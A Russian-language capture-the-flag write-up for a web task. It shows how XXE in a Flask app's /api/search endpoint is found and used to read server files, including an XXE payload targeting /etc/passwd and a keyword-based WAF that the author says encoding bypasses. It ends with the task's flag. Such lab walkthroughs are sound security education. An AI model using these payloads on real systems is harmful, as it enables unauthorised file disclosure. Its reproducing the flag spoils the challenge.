**Write‑up: «Эхо прошлого» (Medium)**

Вводные данные:

Название: Эхо прошлого

Уровень: Средний

Тип: Web

Адрес: 62.173.140.174:16092

Цель: получить флаг формата CODEBY{……}

  
Предисловие:  
Таск, хоть и помечен как средний, но он максимально сложный и запутанный.

Кто хочет сам решить, а не просто списать решение, то ниже есть небольшие подсказки

  
1\. Можете не искать ничего в поиске по статьям.  

  
2\. Пустая статья не то, чем кажется

  
3\. Флаг находиться в файле flag.txt рядом с данными

**Этап 1. Первичное исследование сервиса**

Открывая сайт - http://62.173.140.174:16092 видим его главную страницу.  

  
Ещё на пятой странице можно увидеть странную статью  
  
Но как окажется позже. Это просто замануха и фейк.  
<br/>Поэтому начинаем изучать поиск по статьям, но он ничего особо не даст.  
Я пробовал:  
1\. SQLi  
2\. Blind SQLi  
3\. SSTI  
4\. Reflected XSS  
5\. Поиск, по ключевым словам  
6\. И различные спец символы

7\. Всё в перемешку + более сложные конструкции  
<br/><br/>Получается осталось только проверить Брутфорс директорий с помощью gobuster или ffuf.  
Проверяем / но ничего не находим, а потом проверяем /api и находим вкладку  
/api/search

  
<br/>Замечаем, что это POST /api/search и продолжаем анализ

  
Сервис принимает данные в зависимости от Content-Type:

application/xml → XML‑парсинг

application/json → поиск по архиву новостей

Это сразу указывает на XML‑парсер на сервере.

**Этап 2. Обнаружение XXE**

Попробуем какой-нибудь простенький пэйлоад

POST /api/search HTTP/1.1

Host: 62.173.140.174:16092

Content-Type: application/xml

Content-Length: 131

&lt;?xml version="1.0"?&gt;

<!DOCTYPE foo \[

&lt;!ENTITY xxe SYSTEM "file///etc/passwd"&gt;

\]>

&lt;search&gt;

&lt;query&gt;&xxe;&lt;/query&gt;

&lt;/search&gt;

становится ясно, что:

внешние сущности не отключены

сервер пытается читать файлы через file://

Следовательно, присутствует XXE‑уязвимость так ещё и сверху WAF.  

**Этап 3. Анализ WAF  
**Самое интересное что WAF видимо не пропускает часть запросов, но в целом он разрешает читать другие файлы. Гениально, конечно.  
Теперь попробуем найти какой-либо файл. Я решил искать сам WAF. Ну и со второй попытки его нашёл в директории - /proc/self/cwd/utils/waf.py  

Анализируем фрагмент Python‑кода:

def check_waf(xml_data, format_param):

suspicious_paths = \[

r'flag',

r'/etc/',

r'/root/'

\]

for path in suspicious_paths:

if re.search(path, xml_data, re.IGNORECASE):

if format_param == 'raw' and path == r'flag':

continue

return True

return False

Выводы:

WAF работает по строковому совпадению, а не по реальному пути и строка flag: запрещена по умолчанию, но разрешена, если format=raw

Это ключевая логическая особенность задания

/etc/ и /root/ запрещены всегда, но если вам прям интересно, то с помощью кодировки можно спокойно обойти.

**Этап 4. Использование format=raw**

Корректный запрос в будущем должен начинаться так:

POST /api/search HTTP/1.1

Host: 62.173.140.174:16092

Content-Type: application/xml

**Этап 5. Анализ структуры приложения**

Через XXE были прочитаны Python‑файлы приложения:

**/proc/self/cwd/main.py**

from flask import Flask

from routes.web_routes import web_bp

from routes.api_routes import api_bp

app = Flask(\__name_\_, template_folder='templates', static_folder='static')

app.register_blueprint(web_bp)

app.register_blueprint(api_bp)

**/proc/self/cwd/routes/api_routes.py**

Ключевой фрагмент из этого кода:

with open('/app/data/articles.json', 'r') as f:

articles = json.load(f)

приложение работает с данными из каталога /app

каталог /app/data используется для хранения данных

значит, флаг логично искать именно там

**Этап 6. Ограничение XML (важный момент)**

Попытки прочитать .py или .html файлы напрямую через XXE приводили к ошибкам вида:

Invalid XML: Premature end of data

Причина:

XML не экранирует содержимое внешних сущностей

символы &lt; &gt; & ломают документ. Так что многие файлы будет абсолютно невозможно посмотреть.

флаг обязан находиться в XML‑safe файле

т.е. обычный текст (.txt)

Это исключает:

.py

.html

.json

**Этап 7. Финальный путь к флагу**

С учётом всех фактов:

базовый каталог: /app

данные приложения: /app/data

имя файла: flag

формат: текстовый

Финальный payload будет выглядеть так:

Результат

Сервер возвращает содержимое файла:

CODEBY{hidden_echoes_2025}
